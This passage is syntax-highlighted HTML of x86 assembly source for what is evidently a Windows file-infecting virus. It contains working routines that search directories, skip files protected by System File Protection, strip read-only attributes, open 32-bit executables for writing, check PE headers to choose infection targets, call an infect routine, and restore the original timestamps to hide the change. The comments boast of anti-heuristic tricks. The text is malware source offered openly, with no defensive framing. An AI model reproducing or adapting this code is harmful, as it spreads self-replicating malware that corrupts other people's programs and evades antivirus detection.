        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_dirfile</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;close find, and free list node</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">krncrcstk.kFindClose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">

</span><span class="sc5">file_prev</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.findprev</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_exit</span><span class="sc0">

</span><span class="sc5">step_updir</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;the ANSI string ".." can be used, even on Unicode platforms</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'..'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">file_next</span><span class="sc0">

</span><span class="sc5">test_file</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;get full path and convert to Unicode if required (SFC requires Unicode path)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;save original file attributes for close</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kGetFullPathNameW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetVersion</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">store_sfcapi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;use default translation</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;CP_ANSI</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kMultiByteToWideChar</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">

</span><span class="sc5">store_sfcapi</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;don't touch protected files</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'!bgr'</span><span class="sc0">                     </span><span class="sc1">;SfcIsFileProtected</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;fake success in case of no SFC</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">leave_sfc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">leave_sfc</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">restore_attr</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_fileattr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;attribute ignored for existing files</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kCreateFileW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_infect</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                             </span><span class="sc1">;mask CALL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">                     </span><span class="sc1">;Super Nashwan power ;)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kSetFileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCloseHandle</span><span class="sc0">

</span><span class="sc5">restore_attr</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;restore original file attributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_fileattr</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">file_next</span><span class="sc0">
</span><span class="sc5">find_files</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;look for MZ and PE file signatures</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">is_pehdr</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;edi -&gt; map view</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">            </span><span class="sc1">;Windows does not check 'MZ'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">pehdr_ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mzhdr.mzlfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;SEH protects against bad lfanew value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'EP'</span><span class="sc0">                      </span><span class="sc1">;anti-heuristic test filetype ;) and clear EAX</span><span class="sc0">

</span><span class="sc5">pehdr_ret</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;if PE file, then eax = 0, esi -&gt; COFF header, Z flag set</span><span class="sc0">
</span><span class="sc5">is_pehdr</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;reset/set read-only file attribute</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">set_fileattr</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;ebx = file attributes, esi -&gt; findlist, ebp -&gt; platform APIs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.cFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kSetFileAttributesW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;edi -&gt; filename</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"07/05/03"</span><span class="sc0">
</span><span class="sc5">set_fileattr</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">test_infect</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;esi = find data, edi = map view, ebp -&gt; platform APIs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">map_view</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_pehdr</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_name</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">                     </span><span class="sc1">;only Intel 386+</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">                        </span><span class="sc1">;move high 16 bits into low 16 bits and multiply by 8</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;complete multiply by 28h (size pesect)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.peflags</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.petimedate</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them</span><span class="sc0">
</span><span class="sc1">;no .dll files this time</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_UP_SYSTEM_ONLY</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;32-bit executable file...</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">                     </span><span class="sc1">;cannot use xor+jpo because 0 is also jpe</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;the COFF magic value is not checked because Windows ignores it anyway</span><span class="sc0">
</span><span class="sc1">;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pehdr.pesubsys</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.petimedate</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_CUI</span><span class="sc0">
        </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">inftest_ret</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_GUI</span><span class="sc0"> </span><span class="sc1">;al not ax, because ah is known now to be 0</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">inftest_ret</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1eh</span><span class="sc0">                        </span><span class="sc1">;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">inftest_ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;avoid files which seem to contain attribute certificates</span><span class="sc0">
</span><span class="sc1">;because one of those certificates might be a digital signature</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pesecurity.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pestackmax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">inftest_ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size</span><span class="sc0">
</span><span class="sc1">;the Optional Header can be larger than the offset of the last directory</span><span class="sc0">
</span><span class="sc1">;remember: even if you have not seen it does not mean that it does not happen :)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.peopthdrsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pestackmax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pefilealign</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pestackmax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pestackmax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pemagic</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pesect</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectrawsize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.dwFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">                     </span><span class="sc1">;file contains appended data</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.dwFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
